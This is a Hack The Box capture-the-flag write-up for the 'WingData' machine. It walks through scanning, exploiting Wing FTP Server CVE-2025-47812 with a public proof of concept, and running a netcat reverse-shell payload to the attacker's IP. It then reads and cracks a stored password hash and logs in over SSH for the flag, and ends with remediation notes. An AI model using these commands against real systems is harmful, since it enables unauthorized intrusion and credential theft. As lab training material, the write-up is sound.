# WingData HTB Writeup

Author: Trushit Oza

## Target Information

- Machine: WingData
- Platform: Hack The Box
- Primary Hostname: wingdata.htb
- Target IP: 10.129.244.106
- Objective: Gain initial access, enumerate local data, and capture user flag

## 1. Reconnaissance

### Update local host resolution

```bash
echo "10.129.244.106 wingdata.htb ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

### Port and service scan

```bash
nmap -sS -sV 10.129.244.106
```

### Relevant findings

```text
22/tcp open  ssh   OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp open  http  Apache httpd 2.4.66
```

- Web title: WingData Solutions
- Web server: Apache/2.4.66 (Debian)

![Nmap scan results](nmap-scan.png)

## 2. Web Enumeration

### Initial web behavior

- Visiting http://10.129.244.106 redirects to http://wingdata.htb.
- The Client Portal path redirects to ftp.wingdata.htb.

### Service fingerprinting

- On ftp.wingdata.htb, the application version is exposed as Wing FTP Server v7.4.3.

![Web redirect flow](web.png)
![FTP subdomain page](ftp.web.png)

## 3. Vulnerability Identification

- Identified version: Wing FTP Server v7.4.3
- Public vulnerability: CVE-2025-47812
- Impact: Unauthenticated Remote Code Execution (RCE)

I searched for a publicly available proof of concept and used the following repository:

```bash
git clone https://github.com/4m3rr0r/CVE-2025-47812-poc.git
cd CVE-2025-47812-poc
```

![PoC repository and local setup](github-poc.png)

## 4. Exploitation

### Start listener

```bash
nc -lvnp 5555
```

### Execute exploit

```bash
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc 10.10.14.79 5555 -e /bin/sh" -v
```

### Confirm shell access

```bash
id
python3 -c "import pty; pty.spawn('/bin/bash')"
```

![Exploit execution](run-script.png)
![Listener confirmation](listner.png)
![Reverse shell access](shell.png)

## 5. Post-Exploitation and Credential Discovery

### Locate user data

```bash
cd /opt/wftpserver/Data/1/users
ls
cat wacky.xml
```

The XML user file revealed credentials for local account wacky, including a stored hash:

```text
username: wacky
hash: 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

![Credential artifact in wacky.xml](shell2.png)

## 6. Password Cracking

Prepared hash input and cracked with hashcat:

```bash
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > password.txt
hashcat -m 1410 password.txt /usr/share/wordlists/rockyou.txt
```

Recovered password:

```text
!#7Blushing^*Bride5
```

<!-- ![Supporting screenshot for this phase](version.png) -->

## 7. SSH Access and User Flag

### SSH login

```bash
ssh wacky@10.129.244.106
```

### Retrieve user flag

```bash
cat ~/user.txt
```

![User flag retrieval](userflag.png)

## Remediation Notes

- Upgrade Wing FTP Server to a patched version that remediates CVE-2025-47812.
- Restrict management and portal exposure to trusted networks.
- Remove or harden command execution paths reachable from unauthenticated contexts.
- Enforce strong credential storage and avoid recoverable secrets in local XML files.
- Monitor for reverse shell patterns and suspicious outbound connections.

## Evidence Checklist

- [x] Recon and service discovery
- [x] Version disclosure and vulnerable service confirmation
- [x] Public PoC acquisition
- [x] Remote code execution
- [x] Local credential discovery
- [x] Password recovery
- [x] SSH access and user flag retrieval
